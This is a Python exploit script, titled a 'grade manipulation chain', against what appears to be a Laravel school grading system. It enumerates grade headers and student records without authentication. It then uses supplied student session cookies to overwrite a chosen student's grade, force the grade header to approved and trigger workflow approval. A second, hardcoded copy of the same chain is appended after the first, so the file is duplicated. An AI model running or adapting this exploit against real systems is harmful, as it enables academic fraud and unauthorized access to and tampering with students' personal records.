import requests
import sys

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN   = "\033[96m"
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
DIM    = "\033[90m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def _build_banner():
    art = [
        "             ^",
        "            /A\\",
        "           //I\\\\",
        "          ///I\\\\\\",
        "         ////I\\\\\\\\",
        "        /////I\\\\\\\\\\",
        "       //////I\\\\\\\\\\\\",
        "      ///////I\\\\\\\\\\\\\\",
        "     ////////I\\\\\\\\\\\\\\\\",
        "    /////////I\\\\\\\\\\\\\\\\\\",
        "   //////////I\\\\\\\\\\\\\\\\\\\\",
        "    '////////I\\\\\\\\\\\\\\\\\\'",
        "KCK   '//////I\\\\\\\\\\\\'",
        "        '////I\\\\\\\\'",
        "          '//I\\\\'",
        "            'I'",
    ]

    nexus = [
        "\u2588\u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557  \u2588\u2588\u2557\u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
        "\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u255a\u2588\u2588\u2557\u2588\u2588\u2554\u255d\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d",
        "\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557   \u255a\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  ",
        "\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d   \u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551   \u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551",
        "\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2554\u255d \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551",
        "\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
    ]

    T = max(len(l) for l in nexus)
    colored_title = (
        [" " * T] * 5
        + [f"{CYAN}{l}{RESET}{' ' * (T - len(l))}" for l in nexus]
        + [" " * T] * 5
    )

    lines = [""]
    for t, a in zip(colored_title, art):
        lines.append(f"  {t}    {RED}{a}{RESET}")
    lines.append(f"\n  {DIM}grade manipulation chain  //  step-by-step exploit{RESET}\n")
    return "\n".join(lines)

BANNER = _build_banner()
print(BANNER)

# ── helpers ──────────────────────────────────────────────────────────────────

def section(title):
    print(f"\n  {DIM}┌─── {RESET}{CYAN}{BOLD}{title}{RESET}")

def step(n, label):
    print(f"  {DIM}├─[{RESET}{YELLOW}{n}{RESET}{DIM}]{RESET} {label}")

def ok(msg):
    print(f"  {DIM}│   {GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"  {DIM}│   {RED}[-]{RESET} {msg}")
    print(f"  {DIM}└{'─' * 44}{RESET}")
    sys.exit(1)

def divider():
    print(f"  {DIM}└{'─' * 44}{RESET}")

# ── inputs ────────────────────────────────────────────────────────────────────

try:
    section("Target Configuration")
    BASE_URL       = input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Target URL             : ").strip().rstrip("/")
    TARGET_SY      = int(input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} SY ID (default 1)      : ").strip() or "1")
    TARGET_SECTION = int(input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Section ID             : ").strip())
    TARGET_LEVEL   = int(input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Level ID               : ").strip())
    TARGET_SUBJ    = int(input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Subject ID             : ").strip())
    TARGET_QUARTER = int(input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Quarter (default 1)    : ").strip() or "1")
    TARGET_STUDID  = int(input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Target Student ID      : ").strip())
    TARGET_GRADE   = int(input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Grade to set (def 100) : ").strip() or "100")
    section("Session Cookies")
    STUDENT_SESSION    = input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Student session        : ").strip()
    NONDEFAULT_SESSION = input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Non-default session    : ").strip()
    divider()
except KeyboardInterrupt:
    print(f"\n\n  {YELLOW}[!]{RESET} Aborted.")
    raise SystemExit(0)

print()
s = requests.Session()

# ── step 1: grade headers ─────────────────────────────────────────────────────

step(1, "Enumerating grade headers (unauthenticated)...")
try:
    r = s.get(f"{BASE_URL}/get/grade/header", params={
        "syid": TARGET_SY, "gradelevelid": TARGET_LEVEL,
        "subjectid": TARGET_SUBJ, "quarter": TARGET_QUARTER,
        "sectionid": TARGET_SECTION
    }, timeout=5)
    headers_data = r.json()
except Exception as e:
    fail(f"Request failed: {e}")

if not headers_data:
    fail("No grade headers found — adjust parameters.")

header    = headers_data[0]
header_id = header["id"]
ok(f"header id={header_id}  status={header.get('status')}  submitted={header.get('submitted')}")

# ── step 2: student record ────────────────────────────────────────────────────

step(2, "Enumerating student grade records (unauthenticated mastersheet)...")
try:
    r = s.get(f"{BASE_URL}/grades/report/mastersheet", params={
        "syid": TARGET_SY, "sectionid": TARGET_SECTION,
        "levelid": TARGET_LEVEL, "quarter": TARGET_QUARTER
    }, timeout=5)
    students = r.json()
except Exception as e:
    fail(f"Request failed: {e}")

target = next((st for st in students if st.get("id") == TARGET_STUDID), None)
if not target:
    fail(f"Student id={TARGET_STUDID} not found in mastersheet.")

detail_id = target.get("detailid") or target.get("gdid")
ok(f"{target.get('lastname')}, {target.get('firstname')} | detail_id={detail_id} | current grade={target.get('grade')}")

# ── step 3: inflate grade ─────────────────────────────────────────────────────

step(3, f"Inflating grade → {TARGET_GRADE} (student session)...")
s.cookies.set("laravel_session", STUDENT_SESSION)
try:
    r = s.get(f"{BASE_URL}/gradesdetail/update", params={
        "data[0][id]":     detail_id,
        "data[0][studid]": TARGET_STUDID,
        "data[0][field]":  "grade",
        "data[0][grade]":  TARGET_GRADE
    }, timeout=5)
    result = r.json()
except Exception as e:
    fail(f"Request failed: {e}")

if result and result[0].get("status") == 1:
    ok(f"Grade successfully set to {TARGET_GRADE}!")
else:
    fail(f"Grade inflation failed: {r.text}")

# ── step 4: force header approved ────────────────────────────────────────────

step(4, "Forcing grade header status → approved (student session)...")
try:
    r = s.get(f"{BASE_URL}/gradesheader/update", params={
        "data[0][id]":        header_id,
        "data[0][syid]":      TARGET_SY,
        "data[0][sectionid]": TARGET_SECTION,
        "data[0][subjid]":    TARGET_SUBJ,
        "data[0][field]":     "status",
        "data[0][grade]":     3
    }, timeout=5)
    result = r.json()
except Exception as e:
    fail(f"Request failed: {e}")

if result and result[0].get("status") == 1:
    ok("Grade header status forced to approved!")
else:
    fail(f"Header status force failed: {r.text}")

# ── step 5: workflow approval ─────────────────────────────────────────────────

step(5, "Triggering workflow approval (non-default session)...")
s.cookies.set("laravel_session", NONDEFAULT_SESSION)
try:
    r = s.get(f"{BASE_URL}/posting/grade/subject/approve", params={
        "gdid": detail_id, "teacherid": 1
    }, timeout=5)
    ok(f"Workflow response: {r.text[:80]}")
except Exception as e:
    fail(f"Request failed: {e}")

divider()
print(f"\n  {GREEN}[✓]{RESET} {BOLD}Chain complete.{RESET}")
print(f"  {DIM}student id={TARGET_STUDID}  subject={TARGET_SUBJ}  grade={TARGET_GRADE}  status=approved{RESET}\n")

TARGET_STUDID = 456
TARGET_SY = 1
TARGET_SECTION = 2
TARGET_LEVEL = 3
TARGET_SUBJ = 5
TARGET_QUARTER = 1

s = requests.Session()

# === STEP 1: Recon — enumerate grade headers (no auth required) ===
print("[*] Step 1: Enumerate grade headers (unauthenticated)...")
r = s.get(f"{BASE_URL}/get/grade/header", params={
    "syid": TARGET_SY, "gradelevelid": TARGET_LEVEL,
    "subjectid": TARGET_SUBJ, "quarter": TARGET_QUARTER,
    "sectionid": TARGET_SECTION
})
headers = r.json()
if not headers:
    print("[-] No grade headers found. Adjust parameters.")
    sys.exit(1)
header = headers[0]
header_id = header["id"]
print(f"    [+] Grade header id={header_id}, status={header.get('status')}, submitted={header.get('submitted')}")

# === STEP 2: Find target student's gradesdetail rows (no auth required) ===
print("[*] Step 2: Enumerate student grade records (unauthenticated mastersheet)...")
r = s.get(f"{BASE_URL}/grades/report/mastersheet", params={
    "syid": TARGET_SY, "sectionid": TARGET_SECTION, "levelid": TARGET_LEVEL, "quarter": TARGET_QUARTER
})
students = r.json()
target = next((st for st in students if st.get("id") == TARGET_STUDID), None)
if not target:
    print(f"[-] Student id={TARGET_STUDID} not found in mastersheet.")
    sys.exit(1)
detail_id = target.get("detailid") or target.get("gdid")
print(f"    [+] Found student: {target.get('lastname')}, {target.get('firstname')} | detail_id={detail_id} | current grade={target.get('grade')}")

# === STEP 3: Inflate grade (uses student session — any user type works) ===
print("[*] Step 3: Inflating grade to 100 (student session, no teacher auth)...")
s.cookies.set("laravel_session", STUDENT_SESSION)
r = s.get(f"{BASE_URL}/gradesdetail/update", params={
    "data[0][id]": detail_id,
    "data[0][studid]": TARGET_STUDID,
    "data[0][field]": "grade",
    "data[0][grade]": 100
})
result = r.json()
if result and result[0].get("status") == 1:
    print("    [+] Grade successfully inflated to 100!")
else:
    print(f"    [-] Grade inflation failed: {r.text}")

# === STEP 4: Force grade header to approved status ===
print("[*] Step 4: Forcing grade header status to approved (student session)...")
r = s.get(f"{BASE_URL}/gradesheader/update", params={
    "data[0][id]": header_id,
    "data[0][syid]": TARGET_SY,
    "data[0][sectionid]": TARGET_SECTION,
    "data[0][subjid]": TARGET_SUBJ,
    "data[0][field]": "status",
    "data[0][grade]": 3  # 3 = approved
})
result = r.json()
if result and result[0].get("status") == 1:
    print("    [+] Grade header status forced to approved!")
else:
    print(f"    [-] Header status force failed: {r.text}")

# === STEP 5: Trigger workflow approval (requires changed password — any user type) ===
print("[*] Step 5: Triggering workflow approval (any non-default-password session)...")
s.cookies.set("laravel_session", NONDEFAULT_SESSION)
gdid = detail_id  # or the grade detail group id
r = s.get(f"{BASE_URL}/posting/grade/subject/approve", params={
    "gdid": gdid, "teacherid": 1  # teacherid is ignored by implementation
})
print(f"    [+] Workflow approve response: {r.text[:100]}")

print("\n[*] COMPLETE: Grade manipulation chain executed.")
print(f"    Student id={TARGET_STUDID} grade for subject {TARGET_SUBJ} → 100 (approved in workflow)")
